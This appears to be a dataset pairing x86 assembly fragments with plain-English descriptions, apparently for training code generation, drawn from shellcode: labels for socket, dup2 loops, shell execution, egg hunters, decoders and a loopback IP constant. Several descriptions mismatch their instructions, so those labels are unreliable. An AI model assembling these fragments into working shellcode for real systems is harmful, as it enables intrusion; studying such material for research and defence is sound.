SNIPPETS	INTENTS
_appendfile:	declare appendfile_label
_appendfile:	define the _appendfile label
_build:	declare _build label
_build:	define the _build label
_child:	define the _child label
_close:	declare _close label
_close:	define the _close label
_cmd:	define _cmd label
_cmd:	declare _cmd register
_cmd:	define the _cmd label
_continue:	define the _continue label
_decoder:	define _decoder_label
_dup2_loop:	define _dup2_loop label
_dup2_loop:	define the _dup2_loop label
_egg:	define the _egg label
_exec:	declare _exec _label
_exec:	define _exec label
_exec:	declare _exec label
_exec:	define the _exec label
_execline:	define _execline label
_execline:	define the _execline label
_exit:	define _exit label
_exit:	define the _exit label
_file:	_declare _file label
_file:	define _file_label
_file:	define the _file label
_ip equ 0x0100007f	define ip address as _ip = 0x0100007f
_ip equ 0x0100007f	define ip equal to 0x0100007f
_isegg:	define the _isegg label
_load_data:	define _load_data label
_load_data:	define the _load_data label
_next:	define the _next label
_param:	declare _param label
_param:	define the _param label
_params:	define _params label
_params:	define the _params label
_parent_read:	define the _parent_read label
_parent:	define the _parent label
_random:	define _random label
_random:	define the _random label
_read:	define _read label
_return:	define the _return label
_setsockopt:	define the _setsockopt label
_shell:	define the _shell label
_socket:	define the _socket label
_start:	declare _start label
_start:	_start function
_start:	_start label
_start:	_start
_start:	define the _start label
_start: \n jmp call_decoder	define the _start label and jump short to the call_decoder
_start: \n jmp call_decoder	define the _start label and jump to the call_decoder
_start: \n jmp call_decoder	define the _start label and jump to call_decoder
_start: \n jmp short call_decoder	define the _start label and jump short to the call_decoder
_start: \n jmp short call_decoder	define the _start label and jump short to call_decoder
_start: \n jmp short call_shellcode	define the _start label and jump short to the call_shellcode
_start: \n jmp short call_shellcode	define the _start label and jump short to call_shellcode
_start: \n jmp short call_shellcode	define the _start label and jump short to call_shellcode label
_start: \n jmp short enc	define the _start label and jump short to enc
_start: \n jmp short stage	define the _start label and jump short to stage
_user:	declare _user label
_user:	define the _user label
_while_loop:	define the _while_loop label
_write:	declare _write label
_write:	define _write label
_write:	define the _write label
1:	define the numeric label 1
1:	define the label 1
2:	define the label 2
2:	define the numeric label 2
3:	define the label 3
3:	define the numeric label 3
a_letter db 'd'	allocate one byte of memory for a_letter variable and initialize it to 'd'
aas	correct the result od the previous unpacked decimal substraction in al register
adc eax, 0x9c09ebea	sum hexadecimal value 0x9c09ebea with eax register. if cf is set, add 1 to eax.
add [ebp-4], esi	add esi into memory address ebp-4
add ah, bh	add the contents of the bh register into the ah register
add al, 0x2	add 0x2 to al
add al, 0x25	add 0x25 to the al register
add al, 0x3	add 0x3 to the contents in al and save the result in al
add al, 0x33	add 0x33 to the contents in al and save the result in al
add al, 0x40	add 0x40 to the al register
add al, 0x66	add 0x66 to the contents in al and save the result in al
add al, 0xa	add 0xa to the al register
add al, 0xb	add 0xb to the al register
add al, 2	add 2 to al register
add al, 2	add the value 2 to the contents of the al register
add al, 3	add 3 to al register
add al, 3	add 3 to al
add al, byte '0'	add byte '0' to al
add al, byte [edi]	add the byte in edi to the al register
add al,0x2	add hexadecimal value 0x2 to al register
add al,0x3	add the value 0x3 into al register
add al,0x33	add the hexadecimal value 0x33 to al register
add al,0x3b	add hexadecimal value 0x3b to al register
add al,0x66	add the hexadecimal value 0x66 to al register
add ax, [di + 20]	add memory[di + 20] to ax
add ax, 01	add 01 to ax
add ax, bx	add the contents of bx into ax
add bl, 0x2	load jexadecimal value 0x2 into bl register
add bl, 0x2	add 2 to bl content
add bl, 0x2	add 0x2 to the contents in bl and save the result in bl
add bx, ax	add ax to bx
add byte [edi], 0x4 \n not byte [edi]	add 0x4 from the byte at the address edi and negate the result
add byte [edi], 7 \n not byte [edi]	add the byte at the address edi after subtracting the value 7
add byte [edi], 8 \n not byte [edi]	add the value 8 from the byte in edi and negate it
add byte [esi], 0x02	add 0x02 to the current byte in esi
add byte [esi], 0x1 \n not byte [esi]	add 0x1 from the current byte of the shellcode and negate the result
add byte [esi], 0x1 \n not byte [esi]	add 0x1 from the byte at the address esi and negate the result
add byte [esi], 0x10	add 0x10 to the current byte in esi
add byte [esi], 0x9 \n not byte [esi]	add the value 0x9 from the current byte of the shellcode and then negate the result
add byte [esi], 2	adds 2 to the first character pointed from esi
add byte [esi], 2	add the byte value 2 to the esi register
add byte [esi], 2 \n not byte [esi]	negate the byte at the address esi after adding the value 2
add byte [esi], 3 \n not byte [esi]	add the value 3 from the byte in esi and negate it
add byte [var], 10	add 10 to the single byte stored at memory address var
add byte [var], 20	add 20 to the single byte stored at memory address var
add byte [var], 30	add 30 to the single byte stored at memory address var
add byte_value, 65	add an immediate operand 65 to byte_value
add byte_value, dl	add the register dl in the memory location byte_value
add cl, 0x2	add 2 to counter
add cl, 0x2	add 2 to counter cl
add cl, 0x2	add 0x2 to the contents in cl and save the result in cl
add cl, 0xb8	add 0xb8 to the cl register
add dx, 0x1b	add the value 0x1b into the dx register
add dx, 0x2f2f	add 0x2f2f to the contents in dx and save the result in dx
add dx,0x1b	add 27 to dx contents
add dx,0x2f2f	then add to it the hexadecimal value 0x2f2f.
add eax, [ebp-4]	add the contents of the local variable stored at ebp-4 into eax
add eax, 0x10	add 0x10 to eax
add eax, 0x12345678	add 0x12345678 to the contents in eax and save the result in eax
add eax, 0x2d383638	add 0x2d383638 to the contents in eax and save the result in eax
add eax, 0x2d383638 \n push eax	push ‘hmod’ on stack
add eax, 0x31179798	add 0x31179798 to the contents in eax and save the result in eax
add eax, 0x5 \n jnz L2	add 0x5 to edx and jump to L2 if the result is not 0
add eax, 0x7 \n jnz L4	add the value 0x7 to eax and jump to the label L4 if the sum is not zero
add eax, 1 \n jnz L1	add 1 to ebx and jump to L1 if the result is not zero
add eax, 10	add 10 to eax
